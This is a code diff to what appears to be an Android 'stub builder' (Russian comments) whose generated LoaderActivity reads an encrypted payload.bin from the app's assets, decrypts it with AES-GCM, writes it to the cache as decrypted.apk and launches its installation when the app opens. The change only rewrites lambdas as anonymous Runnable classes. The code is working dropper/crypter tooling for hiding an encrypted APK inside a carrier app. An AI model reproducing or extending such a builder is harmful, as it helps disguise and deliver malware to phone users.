@@ -160,14 +160,15 @@ class StubBuilder:
         return signed_apk
     
     def generate_loader_activity(self, aes_key_hex: str) -> str:
-        """Генерирует код LoaderActivity"""
+        """Генерирует код LoaderActivity без лямбд"""
         return f'''package com.loader;
 
 import android.app.Activity;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
 import java.io.*;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
@@ -181,30 +182,43 @@ public class LoaderActivity extends Activity {{
     protected void onCreate(Bundle savedInstanceState) {{
         super.onCreate(savedInstanceState);
         
-        new Thread(() -> {{
-            try {{
-                InputStream is = getAssets().open("payload.bin");
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                byte[] buffer = new byte[8192];
-                int bytesRead;
-                while ((bytesRead = is.read(buffer)) != -1) {{
-                    baos.write(buffer, 0, bytesRead);
+        new Thread(new Runnable() {{
+            @Override
+            public void run() {{
+                try {{
+                    InputStream is = getAssets().open("payload.bin");
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    byte[] buffer = new byte[8192];
+                    int bytesRead;
+                    while ((bytesRead = is.read(buffer)) != -1) {{
+                        baos.write(buffer, 0, bytesRead);
+                    }}
+                    byte[] encryptedApk = baos.toByteArray();
+                    is.close();
+                    
+                    final byte[] decryptedApk = decryptAES(encryptedApk);
+                    
+                    final File tempApk = new File(getCacheDir(), "decrypted.apk");
+                    FileOutputStream fos = new FileOutputStream(tempApk);
+                    fos.write(decryptedApk);
+                    fos.close();
+                    
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
+                        @Override
+                        public void run() {{
+                            installApk(tempApk);
+                        }}
+                    }});
+                    
+                }} catch (Exception e) {{
+                    e.printStackTrace();
+                    new Handler(Looper.getMainLooper()).post(new Runnable() {{
+                        @Override
+                        public void run() {{
+                            finish();
+                        }}
+                    }});
                 }}
-                byte[] encryptedApk = baos.toByteArray();
-                is.close();
-                
-                byte[] decryptedApk = decryptAES(encryptedApk);
-                
-                File tempApk = new File(getCacheDir(), "decrypted.apk");
-                FileOutputStream fos = new FileOutputStream(tempApk);
-                fos.write(decryptedApk);
-                fos.close();
-                
-                runOnUiThread(() -> installApk(tempApk));
-                
-            }} catch (Exception e) {{
-                e.printStackTrace();
-                runOnUiThread(() -> finish());
             }}
         }}).start();
     }}
